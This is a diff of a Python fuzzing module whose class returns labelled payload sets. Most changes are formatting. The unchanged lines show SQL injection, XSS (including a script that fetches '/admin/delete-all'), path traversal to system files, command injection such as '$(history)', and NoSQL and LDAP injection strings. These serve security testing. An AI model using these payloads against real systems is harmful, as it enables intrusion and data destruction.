@@ -7,42 +7,43 @@ of endpoints. Like a fox's toolkit, each composable serves a specific
 purpose in the hunt for vulnerabilities.
 """
 
-from typing import List, Dict, Any, Optional
 from dataclasses import dataclass
+from typing import Any
 
 
 @dataclass
 class PayloadSet:
     """Container for organized payload sets."""
+
     name: str
-    payloads: List[Any]
+    payloads: list[Any]
     description: str
 
 
 class PayloadComposables:
     """
     🦊 Payload Composables - Strategic Attack Vector Generator
-    
+
     *red fur gleams with intelligence* This composable provides organized,
     reusable payload sets for different types of attacks. Each method
     returns a PayloadSet containing related attack vectors that can be
     used across multiple fuzzer types.
-    
+
     Example:
         >>> composables = PayloadComposables()
         >>> sql_payloads = composables.get_sql_injection_payloads()
         >>> for payload in sql_payloads.payloads:
         ...     # Use payload in fuzzing
     """
-    
+
     @staticmethod
     def get_sql_injection_payloads() -> PayloadSet:
         """
         Get SQL injection payloads for database attacks.
-        
+
         *fox database hunting* Provides comprehensive SQL injection
         payloads targeting different database systems and injection points.
-        
+
         Returns:
             PayloadSet: SQL injection payloads with metadata
         """
@@ -73,21 +74,21 @@ class PayloadComposables:
             "' OR 1=1 UNION SELECT table_name FROM information_schema.tables--",
             "' OR 1=1 UNION SELECT column_name FROM information_schema.columns--",
         ]
-        
+
         return PayloadSet(
             name="SQL Injection",
             payloads=payloads,
-            description="Comprehensive SQL injection payloads for database attacks"
+            description="Comprehensive SQL injection payloads for database attacks",
         )
-    
+
     @staticmethod
     def get_xss_payloads() -> PayloadSet:
         """
         Get XSS payloads for cross-site scripting attacks.
-        
+
         *fox web hunting* Provides comprehensive XSS payloads targeting
         different contexts and bypass techniques.
-        
+
         Returns:
             PayloadSet: XSS payloads with metadata
         """
@@ -118,21 +119,21 @@ class PayloadComposables:
             "<script>fetch('/admin/delete-all')</script>",
             "<script>XMLHttpRequest</script>",
         ]
-        
+
         return PayloadSet(
             name="XSS",
             payloads=payloads,
-            description="Comprehensive XSS payloads for cross-site scripting attacks"
+            description="Comprehensive XSS payloads for cross-site scripting attacks",
         )
-    
+
     @staticmethod
     def get_path_traversal_payloads() -> PayloadSet:
         """
         Get path traversal payloads for directory traversal attacks.
-        
+
         *fox file system hunting* Provides comprehensive path traversal
         payloads targeting different operating systems and file systems.
-        
+
         Returns:
             PayloadSet: Path traversal payloads with metadata
         """
@@ -168,21 +169,21 @@ class PayloadComposables:
             "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts.deny",
             "../../../etc/issue.net",
         ]
-        
+
         return PayloadSet(
             name="Path Traversal",
             payloads=payloads,
-            description="Comprehensive path traversal payloads for directory traversal attacks"
+            description="Comprehensive path traversal payloads for directory traversal attacks",
         )
-    
+
     @staticmethod
     def get_command_injection_payloads() -> PayloadSet:
         """
         Get command injection payloads for system command execution.
-        
+
         *fox system hunting* Provides comprehensive command injection
         payloads targeting different shell environments and command separators.
-        
+
         Returns:
             PayloadSet: Command injection payloads with metadata
         """
@@ -232,21 +233,21 @@ class PayloadComposables:
             "` history `",
             "$(history)",
         ]
-        
+
         return PayloadSet(
             name="Command Injection",
             payloads=payloads,
-            description="Comprehensive command injection payloads for system command execution"
+            description="Comprehensive command injection payloads for system command execution",
         )
-    
+
     @staticmethod
     def get_nosql_injection_payloads() -> PayloadSet:
         """
         Get NoSQL injection payloads for NoSQL database attacks.
-        
+
         *fox NoSQL hunting* Provides comprehensive NoSQL injection
         payloads targeting MongoDB, CouchDB, and other NoSQL systems.
-        
+
         Returns:
             PayloadSet: NoSQL injection payloads with metadata
         """
@@ -283,21 +284,21 @@ class PayloadComposables:
             '{"$mod": [1, 0]}',
             '{"$text": {"$search": "admin"}}',
         ]
-        
+
         return PayloadSet(
             name="NoSQL Injection",
             payloads=payloads,
-            description="Comprehensive NoSQL injection payloads for NoSQL database attacks"
+            description="Comprehensive NoSQL injection payloads for NoSQL database attacks",
         )
-    
+
     @staticmethod
     def get_ldap_injection_payloads() -> PayloadSet:
         """
         Get LDAP injection payloads for LDAP directory attacks.
-        
+
         *fox directory hunting* Provides comprehensive LDAP injection
         payloads targeting Active Directory and other LDAP systems.
-        
+
         Returns:
             PayloadSet: LDAP injection payloads with metadata
         """
@@ -333,21 +334,21 @@ class PayloadComposables:
             "*)(|(objectClass=device",
             "*)(|(objectClass=distinguishedName",
         ]
-        
+
         return PayloadSet(
             name="LDAP Injection",
             payloads=payloads,
-            description="Comprehensive LDAP injection payloads for LDAP directory attacks"
+            description="Comprehensive LDAP injection payloads for LDAP directory attacks",
         )
-    
+
     @staticmethod
     def get_special_character_payloads() -> PayloadSet:
         """
         Get special character payloads for input validation testing.
-        
+
         *fox edge case hunting* Provides comprehensive special character
         payloads for testing input validation and parsing vulnerabilities.
-        
+
         Returns:
             PayloadSet: Special character payloads with metadata
         """
@@ -356,7 +357,7 @@ class PayloadComposables:
             "\n",
             "\r\n",
             "\\",
-            "\"",
+            '"',
             "'",
             "`",
             "|",
@@ -390,7 +391,7 @@ class PayloadComposables:
             "\v",
             "\a",
             "\b",
-                "\\e",
+            "\\e",
             "\033",
             "\x1b",
             "\u0000",
@@ -410,21 +411,21 @@ class PayloadComposables:
             "\u000e",
             "\u000f",
         ]
-        
+
         return PayloadSet(
             name="Special Characters",
             payloads=payloads,
-            description="Comprehensive special character payloads for input validation testing"
+            description="Comprehensive special character payloads for input validation testing",
         )
-    
+
     @staticmethod
     def get_unicode_payloads() -> PayloadSet:
         """
         Get Unicode payloads for internationalization testing.
-        
+
         *fox global hunting* Provides comprehensive Unicode payloads
         for testing internationalization and character encoding vulnerabilities.
-        
+
         Returns:
             PayloadSet: Unicode payloads with metadata
         """
@@ -459,21 +460,21 @@ class PayloadComposables:
             "𝓐𝓑𝓒𝓓𝓔𝓕𝓖𝓗𝓘𝓙𝓚𝓛𝓜𝓝𝓞𝓟𝓠𝓡𝓢𝓣𝓤𝓥𝓦𝓧𝓨𝓩",
             "𝔄𝔅ℭ𝔇𝔈𝔉𝔊ℌℑ𝔍𝔎𝔏𝔐𝔑𝔒𝔓𝔔ℜ𝔖𝔗𝔘𝔙𝔚𝔛𝔜ℨ",
         ]
-        
+
         return PayloadSet(
             name="Unicode",
             payloads=payloads,
-            description="Comprehensive Unicode payloads for internationalization testing"
+            description="Comprehensive Unicode payloads for internationalization testing",
         )
-    
+
     @staticmethod
     def get_oversized_payloads() -> PayloadSet:
         """
         Get oversized payloads for buffer overflow and DoS testing.
-        
+
         *fox resource hunting* Provides comprehensive oversized payloads
         for testing buffer overflow vulnerabilities and resource exhaustion.
-        
+
         Returns:
             PayloadSet: Oversized payloads with metadata
         """
@@ -509,21 +510,21 @@ class PayloadComposables:
             "test" * 100 + "TEST" * 100,  # Mixed case words
             "a" * 1000 + "\n" + "b" * 1000,  # With newlines
         ]
-        
+
         return PayloadSet(
             name="Oversized",
             payloads=payloads,
-            description="Comprehensive oversized payloads for buffer overflow and DoS testing"
+            description="Comprehensive oversized payloads for buffer overflow and DoS testing",
         )
-    
+
     @staticmethod
     def get_boolean_parameter_variations() -> PayloadSet:
         """
         Get boolean parameter variations for parameter manipulation testing.
-        
+
         *fox parameter hunting* Provides comprehensive boolean parameter
         variations for testing parameter parsing and validation.
-        
+
         Returns:
             PayloadSet: Boolean parameter variations with metadata
         """
@@ -561,21 +562,21 @@ class PayloadComposables:
             {"value": "ENABLED"},
             {"value": "DISABLED"},
         ]
-        
+
         return PayloadSet(
             name="Boolean Parameters",
             payloads=payloads,
-            description="Comprehensive boolean parameter variations for parameter manipulation testing"
+            description="Comprehensive boolean parameter variations for parameter manipulation testing",
         )
-    
+
     @staticmethod
     def get_format_parameter_variations() -> PayloadSet:
         """
         Get format parameter variations for content type testing.
-        
+
         *fox format hunting* Provides comprehensive format parameter
         variations for testing content type parsing and validation.
-        
+
         Returns:
             PayloadSet: Format parameter variations with metadata
         """
@@ -611,9 +612,9 @@ class PayloadComposables:
             {"format": "text/html; charset=utf-8"},
             {"format": "text/plain; charset=utf-8"},
         ]
-        
+
         return PayloadSet(
             name="Format Parameters",
             payloads=payloads,
-            description="Comprehensive format parameter variations for content type testing"
+            description="Comprehensive format parameter variations for content type testing",
         )
